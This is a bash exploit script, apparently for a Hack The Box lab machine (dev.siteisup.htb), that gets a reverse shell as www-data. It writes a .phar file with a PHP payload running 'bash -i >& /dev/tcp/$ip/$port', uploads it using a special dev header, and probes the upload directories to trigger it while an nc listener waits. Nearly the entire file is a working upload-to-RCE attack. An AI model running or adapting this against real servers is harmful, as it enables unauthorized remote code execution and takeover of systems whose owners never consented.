#!/bin/bash

# colors
export red="\033[1;31m"
export green="\033[1;32m"
export yellow="\033[1;33m"
export blue="\033[1;34m"
export purple="\033[1;35m"
export cyan="\033[1;36m"
export grey="\033[0;37m"
export reset="\033[m"

# ctrl + c (function)
function signal_handler(){
  echo -e "${red}\n[!] User terminated.${reset}"
  rm -f $file_name
  tput cnorm; exit 1 # return cursor and exit
}

# ctrl + c (signal)
trap signal_handler SIGINT

# hide cursor
tput civis

# display help panel
function help(){
  echo -e "\nDescription: reverse shell to user www-data"
  echo
  echo "[*] Use: $0 ip-address port"
  echo
}

# valid arguments
if [ $# -ne 2 ]; then
  help
  tput cnorm; exit
fi

# variables
ip=$1; port=$2
main_url='http://dev.siteisup.htb'
required_header='Special-Dev: only4dev'
file_name='rce.phar'
php_payload="<?php proc_close(proc_open(\"bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\", array(), \$foo)); ?>" # payload to upload [*]

# create .phar file with payload
function create_file(){
  if [ ! -f $file_name ]; then
    echo "$php_payload" > $file_name
    echo "http://url.fake" >> $file_name # testing ?
  fi
}

# upload file to website
function upload_file(){
  curl -si -H "$required_header" -F file=@$file_name -F check=Check $main_url &>/dev/null & # 10 seconds to response
}

# make file request and get php response (RCE)
function execute_file(){
  uploads_url="$main_url/uploads"
  
  md5_directories=$(curl -si $uploads_url -H "$required_header" -L | html2text | awk '{print $2}' | grep ".*/$" | tr -d '/' | xargs)
  read -ra md5_directories_array <<< "$md5_directories" # IFS=' ' (default)
  
  for md5_dir in "${md5_directories_array[@]}"; do
    file_url="$uploads_url/$md5_dir/$file_name"
    
    echo -e "${green}\n[*]${reset} Searching file in ${cyan}$file_url${reset}:"
    
    file_response=$(curl -s $file_url -H "$required_header")
    if [[ "$file_response" == *"Not Found"* ]]; then
      echo -e "${yellow}\n\t[x] File not found.${reset}"; continue
    fi

    break
  done
}

# alert listening mode
function alert_listen_mode(){
  tput cnorm # return cursor
  echo -e "\nOpen port $port to receive the shell (g.e nc -lvnp $port)"
  echo "Press ENTER to continue"; read -s -n 1 key
  if [[ $key = "" ]]; then
    execute_file
  fi
}

# main flow
# ---------
echo "[*] Creating file: $file_name";
create_file
echo "[*] Uploading file";
upload_file
echo "[+] Executing payload";
alert_listen_mode
